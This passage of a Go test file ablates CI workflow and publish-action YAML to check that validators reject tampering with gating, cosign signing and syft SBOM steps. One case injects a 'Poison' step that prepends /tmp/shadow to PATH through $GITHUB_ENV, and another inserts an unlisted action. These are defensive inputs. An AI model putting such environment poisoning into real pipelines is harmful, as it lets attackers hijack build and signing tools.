		// mergeQueueProductionJobs, so a regression that narrowed it to the first
		// entry would still satisfy the shipped-workflow control AND the
		// deploy-prod arm, leaving the healing job — which also publishes to
		// production — silently unchecked. The ablation below proves the two arms
		// are not redundant.
		"deploy-prod no longer requires the gate job": {
			func(s string) string {
				return strings.Replace(s, deployNeeds, deployNeedsWithoutGate, 1)
			},
			"does not require validate-publication-contract",
		},
		"heal-prod-on-failure no longer requires the gate job": {
			func(s string) string {
				return strings.Replace(s, healNeeds, "    needs: [changes, deploy-prod]", 1)
			},
			"does not require validate-publication-contract",
		},
		// The gate job itself moving or vanishing must fail rather than pass by
		// finding nothing to check.
		"gate job is renamed, so the validator has no home": {
			func(s string) string {
				return strings.Replace(s, gateJobHeader, "  validate-publication-contract-renamed:\n", 1)
			},
			"missing the validate-publication-contract job",
		},
		// The rule the shared-job arrangement could not carry (#2950). The
		// runner's $GITHUB_ENV/$GITHUB_PATH bridges apply to every LATER step, so
		// a step earlier in this job can shadow `go` for the validator while the
		// validator step stays byte-for-byte correct. Both arms leave the
		// validator step untouched, which is exactly why every other rule above
		// still passes on them — the poison is only visible at job scope.
		//
		// 🔴 Anchored on the validator step, which is unique to this job. The
		// obvious anchor (the Setup Go step) occurs in FOUR jobs, so a
		// first-occurrence replace lands in `changes` and the arm silently tests
		// a job the contract no longer gates — an ablation that changes the file
		// without changing the thing under test, which the changed-nothing guard
		// cannot catch.
		"gate job runs a second command step before the validator": {
			func(s string) string {
				return strings.Replace(
					s, stepName,
					"      - name: \U0001F4A5 Poison\n        run: echo 'PATH=/tmp/shadow:$PATH' >> \"$GITHUB_ENV\"\n\n"+stepName,
					1,
				)
			},
			"runs more than one command step",
		},
		"gate job runs an unlisted action that could write the bridges": {
			func(s string) string {
				return strings.Replace(
					s, stepName,
					"      - name: \U0001F4A5 Poison\n        uses: some-org/writes-github-env@v1\n\n"+stepName,
					1,
				)
			},
			"which is not one of the setup actions this gate may contain",
		},
	} {
		t.Run(name, func(t *testing.T) {
			ablated := arm.ablate(ci)
			if ablated == ci {
				t.Fatal("ablation changed nothing; re-aim it rather than trusting the result")
			}
			err := validateProductionRoutes(ablated)
			if err == nil {
				t.Fatal("ablation was accepted, so the check does not constrain it")
			}
			if !strings.Contains(err.Error(), arm.reason) {
				t.Fatalf("refused for the wrong reason: want %q in %q", arm.reason, err.Error())
			}
		})
	}
}

// TestPublicationActionIgnoresNonExecutableText pins the half of the contract
// text scanning could not see: a required command that appears only in a YAML
// comment or a step name is documentation, and the runner executes none of it.
// Each case keeps the literal in the file and removes it from the one surface
// that runs, so a matcher reading raw lines still finds it and passes.
func TestPublicationActionIgnoresNonExecutableText(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	cases := []struct {
		name    string
		old     string
		new     string
		wantErr string
	}{
		{
			name:    "the installer named only in a comment installs nothing",
			old:     "run: .github/scripts/setup-supply-chain-tools.sh",
			new:     "run: echo no-verified-tools # run: .github/scripts/setup-supply-chain-tools.sh",
			wantErr: "verified supply-chain tools",
		},
		{
			name:    "the installer named only by a step name installs nothing",
			old:     "run: .github/scripts/setup-supply-chain-tools.sh",
			new:     "run: echo no-verified-tools\n      # .github/scripts/setup-supply-chain-tools.sh",
			wantErr: "verified supply-chain tools",
		},
		{
			name: "an SBOM command quoted in a step name scans nothing",
			old: "- name: 📋 Generate SBOM (CycloneDX)\n" +
				"      id: generate_sbom\n" +
				"      shell: bash\n" +
				"      env:\n" +
				"        STAGING_DIGEST: ${{ steps.resolve_staging.outputs.digest }}\n" +
				"      run: |\n" +
				"        set -euo pipefail\n" +
				`        syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json`,
			new: `- name: 'syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json'` + "\n" +
				"      id: generate_sbom\n" +
				"      shell: bash\n" +
				"      env:\n" +
				"        STAGING_DIGEST: ${{ steps.resolve_staging.outputs.digest }}\n" +
				"      run: |\n" +
				"        set -euo pipefail\n" +
				"        echo skip-sbom",
			wantErr: "missing SBOM generation",
		},
		{
			name: "a signing command quoted in a comment signs nothing",
			old:  `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new: "        echo skip-signing\n" +
				`        # cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			wantErr: "without signing",
		},
		{
			name:    "a signing command in an inline comment signs nothing",
			old:     `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new:     `        : # cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			wantErr: "sign the resolved staging digest",
		},
		{
			name:    "an echoed signing command signs nothing",
			old:     `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new:     `        echo 'cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"'`,
			wantErr: "sign the resolved staging digest",
		},
		{
			name:    "an SBOM command in an inline comment scans nothing",
			old:     `        syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json`,
			new:     `        : # syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json`,
			wantErr: "generate the CycloneDX SBOM",
		},
		{
			name:    "an echoed SBOM command scans nothing",
			old:     `        syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json`,
			new:     `        echo 'syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json'`,
			wantErr: "generate the CycloneDX SBOM",
		},
		{
			name:    "the installer printed by a heredoc installs nothing",
			old:     "run: .github/scripts/setup-supply-chain-tools.sh",
			new:     "run: |\n        cat <<'EOF'\n        .github/scripts/setup-supply-chain-tools.sh\n        EOF",
			wantErr: "verified supply-chain tools",
		},
		{
			name:    "a signing command printed by a heredoc signs nothing",
			old:     `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new:     "        cat <<'EOF'\n" + `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"` + "\n        EOF",
			wantErr: "sign the resolved staging digest",
		},
		{
			name:    "an SBOM command printed by a heredoc scans nothing",
			old:     `        syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json`,
			new:     "        cat <<'EOF'\n" + `        syft scan "registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}" --output cyclonedx-json=sbom.cdx.json` + "\n        EOF",
			wantErr: "generate the CycloneDX SBOM",
		},
		{
			name:    "an early exit prevents signing",
			old:     `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new:     "        exit 0\n" + `        cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			wantErr: "sign the resolved staging digest",
		},
		{
			name:    "the staging-reference bridge on another step is not the push step's bridge",
			old:     "        STAGING_OCI_REF: ${{ steps.staging_reference.outputs.oci_ref }}\n      run: ./scripts/run-ksail-prod-with-pull-auth.sh workload push",
			new:     "        STAGING_OCI_REF_UNUSED: ${{ steps.staging_reference.outputs.oci_ref }}\n      run: ./scripts/run-ksail-prod-with-pull-auth.sh workload push",
			wantErr: "environment bridge",
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			ablated := strings.Replace(publisher, testCase.old, testCase.new, 1)
			if ablated == publisher {
				t.Fatalf("ablation changed nothing — the control does not target a real line")
			}
			if _, err := decodeWorkflow(ablated); err != nil {
				t.Fatalf("ablation must stay valid YAML so the parser, not a syntax error, decides: %v", err)
			}
			err := validatePublicationAction(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
		})
	}
}
